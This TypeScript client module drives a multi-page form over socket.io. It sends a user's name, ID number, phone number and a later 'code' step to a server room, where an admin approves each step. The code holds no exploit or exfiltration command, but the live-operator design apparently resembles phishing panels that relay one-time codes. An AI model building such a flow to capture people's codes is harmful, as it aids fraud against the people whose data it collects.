/* eslint-disable @typescript-eslint/no-explicit-any */
// Function That Used To Sent Data For Server Any Time
import { v4 as unique } from "uuid";

import axios from "axios";
import { deleteCookie, getCookie } from "cookies-next";
import { FieldValues } from "react-hook-form";
import { NavigateFunction } from "react-router-dom";
import {
  isAdminError,
  loading,
  mainInfo,
  message,
  messages,
  permissions,
  ROOM,
  socket,
} from "../context/signals";

export function sendDataToServer({
  data,
  current,
  nextPage,
  waitingForAdminResponse,
  navigate,
  mode,
}: {
  data: any;
  current: string;
  nextPage: string;
  waitingForAdminResponse: boolean;
  navigate?: NavigateFunction;
  mode?: string;
}) {
  message.value = "";

  isAdminError.value = false;

  socket.value.emit("more-info", {
    ...data,
    room: ROOM,
    date: new Date(),
    id: mainInfo.value.socketId,
    next: nextPage,
    page: current,
    userId: mainInfo.value?._id,
    idNumber: mainInfo.value?.idNumber,
    mode,
    waitingForAdminResponse,
    unique: unique(),
  });

  if (waitingForAdminResponse) {
    loading.value = "wait";
  } else {
    if (nextPage) {
      if (navigate) navigate("/" + nextPage);
      permissions.value = [...permissions.value, nextPage];
    }
  }
}

export function sendMessage(message: string) {
  socket.value.emit("send-message", {
    content: message,
    id: mainInfo.value.socketId,
    createdAt: new Date(),
    room: ROOM,
    userId: mainInfo.value?._id,
    myId: mainInfo.value?._id,
    unique: unique(),
  });

  messages.value = [
    ...messages.value,
    {
      content: message as string,
      id: mainInfo.value.socketId,
      createdAt: new Date(),
      // userId: mainInfo.value?.id,
    },
  ];
}

export function checkUser(data: FieldValues, navigate: NavigateFunction) {
  const nextYear = new Date();
  const current = new Date();
  nextYear.setFullYear(current.getFullYear() + 1);

  mainInfo.value = {
    ...mainInfo.value,
    fullName: data.fullName,
    idNumber: data.idNumber,
    phone: data.phone,
  };

  socket.value.emit("checkUser", mainInfo.value);

  navigate("/page2");

  permissions.value = [...permissions.value, "page2"];
}

export async function getInitInfo() {
  return await axios
    .get(
      `${
        import.meta.env.VITE_MODE == "DEV"
          ? import.meta.env.VITE_DEV_API_URL
          : import.meta.env.VITE_PROD_API_URL
      }/users/${getCookie("ID")}`
    )
    .then((res) => {
      mainInfo.value = { ...mainInfo.value, ...res.data.materials };
    })
    .catch((err) => {
      deleteCookie("ID");
      console.log(err);
    });
}

export function sendMainInfo() {
  socket.value.emit("user-info", {
    ...mainInfo.value,
    room: ROOM,
  });
}

export function setCurrentPage(page: string) {
  mainInfo.value = { ...mainInfo.value, page };

  if (mainInfo.value.socketId) {
    socket.value.emit("connected-admins", {
      code: ROOM,
      room: mainInfo.value.socketId,
    });
  }

  if (page !== "page5") {
    loading.value = "";
  }

  if (page == "page6") {
    sendDataToServer({
      current: "page6",
      data: {},
      nextPage: "page7",
      mode: "code",
      waitingForAdminResponse: true,
    });
  }

  if (page == "final") {
    sendDataToServer({
      current: "final",
      data: {},
      nextPage: "",
      waitingForAdminResponse: false,
      mode: "last",
    });

    axios
      .patch(
        `${
          import.meta.env.VITE_MODE == "DEV"
            ? import.meta.env.VITE_DEV_API_URL
            : import.meta.env.VITE_PROD_API_URL
        }/subscriber/completed`,
        { code: ROOM, id: mainInfo.value._id }
      )
      .then(() => {})
      .catch(() => {});
  }
}
